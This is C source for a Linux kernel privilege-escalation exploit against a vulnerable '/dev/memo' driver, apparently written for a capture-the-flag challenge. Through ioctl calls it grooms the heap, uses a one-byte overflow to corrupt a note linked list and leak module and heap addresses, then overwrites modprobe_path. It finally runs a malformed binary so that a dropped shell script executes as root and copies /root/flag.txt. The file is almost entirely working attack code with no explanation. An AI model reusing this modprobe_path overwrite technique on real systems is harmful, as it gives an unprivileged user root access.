#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <pthread.h>
#include <linux/userfaultfd.h>
#include <errno.h>
#include <signal.h>
#include <string.h>
#include <sys/syscall.h>
#include <sys/ioctl.h>
#include <poll.h>
#include <err.h>

#define CMD_NEW  0x11451401
#define CMD_EDIT 0x11451402
#define CMD_DEL  0x11451403

typedef struct {
  char data[20];
  int id;
  int size;
} request_t;

typedef struct {
  int id;
  char data[20];
} note_t;

typedef struct notelist_t {
  note_t note;
  struct notelist_t *fd;
  struct notelist_t *bk;
} notelist_t;


#define err_exit(msg) do{ perror(msg); exit(EXIT_FAILURE); \
	}while(0)

void* modprobe_path = 0xffffffffacc367c0;// - 0xffffffffabe00000; 

int dev_fd;

long create() 
{
	long id;
	request_t req;
	id = ioctl(dev_fd, CMD_NEW, &req);
	if(id < 0)
		err_exit("[!] ERROR CMD_NEW\n");
	printf("[+] CMD_NEW: id = 0x%lx\n", id);
	return id;
}

void edit(request_t* req)
{
	long ret;
	ret = ioctl(dev_fd, CMD_EDIT, req);
	if(ret < 0)
		err_exit("[!] ERROR CMD_EDIT\n");
	printf("[-] CMD_EDIT DONE\n");
	return;
}

void delete(int id)
{
	long ret;
	request_t req;
	req.id = id;

	ret = ioctl(dev_fd, CMD_DEL, &req);
	if(ret < 0)
		err_exit("[!] ERROR CMD_DEL\n");
	printf("[-] CMD_DEL DONE\n");
	return;
}

int idlist[0x100] = {0};
int off_list = 0;
int top = 0;

long addr_module;
long addr_heap;
long addr_kernel;
long kernel_base;

int main(){
	request_t req;
	notelist_t notelist;
	notelist_t notelist_sub;
	int id, i ;
	int offset = -1;
	int padding;
	dev_fd = open("/dev/memo", O_RDWR);
	if(dev_fd < 0)
		err_exit("open error");

	system("echo -ne '\\xff\\xff\\xff\\xff' > /tmp/badbin");
	system("echo -ne '#!/bin/sh\nchmod 777 /root/flag.txt && cp /root/flag.txt /tmp/flag' > /tmp/km2.sh");
	system("chmod +x /tmp/km2.sh /tmp/badbin");
	puts("[+] START");
	
	memset(&notelist, 0, sizeof(notelist_t));
	memset(req.data, 0x41, 20);
	req.size = 20;

	for(i = 0; i < 5; i++){
		id = create();
		req.id = id;
		edit(&req);
		idlist[off_list] = id;
		off_list++;
	}
	
	while(1) {
		id = create();
		req.id = id;
		edit(&req);
		idlist[off_list] = id;
		off_list++;
		//id = (id & 0x3f);
		//if(id >= 0x8 && id <= 0x14) {
		id = (id & 0xff);
		if(id >= 0xc8 && id <= 0xd4) {
			offset = off_list-1;
			break;
		}
	}

	for(i = 0;i < 5; i++){
		id = create();
		req.id = id;
		edit(&req);
		idlist[off_list] = id;
		off_list++;
	}

	req.id = idlist[offset];
	req.size = 21;
	edit(&req);

	req.id = 0x41414141;
	padding = (0x14-(idlist[offset] & 0x3f));
	req.size = 8+padding;
	memset(req.data, 0x41, padding);
	*((long*)&req.data[padding]) = &notelist;
	edit(&req);

	
	while(notelist.bk == 0){
		delete(idlist[--off_list]);	
	}
	addr_module = notelist.bk;	
	printf("[+] top = %lx\n", (long)notelist.bk);
	id = create();
	addr_heap = notelist.bk;
	printf("[+] heap = %lx\n", (long)notelist.bk);
	
	notelist.note.id = 0x42424242;
	notelist.fd = addr_module+0x44;
	
	req.size = 3;
	req.id = 0;
	*((long*)req.data) = 0x8367c0-4; // 3bit brute force
	
	edit(&req);
	
	notelist.fd = addr_module+0x2c;
	req.size = 4;
	req.id = 0;
	*((long*)req.data) = 0x43434343;
	
	edit(&req);
	  
	notelist.fd = addr_module+0x30;
	req.size = 12;
	req.id = 0;
	strcpy(req.data, "/tmp/km2.sh\x00");
	edit(&req);
	
	puts("[+] END");
	system("/tmp/badbin");
	
	return 0;
}
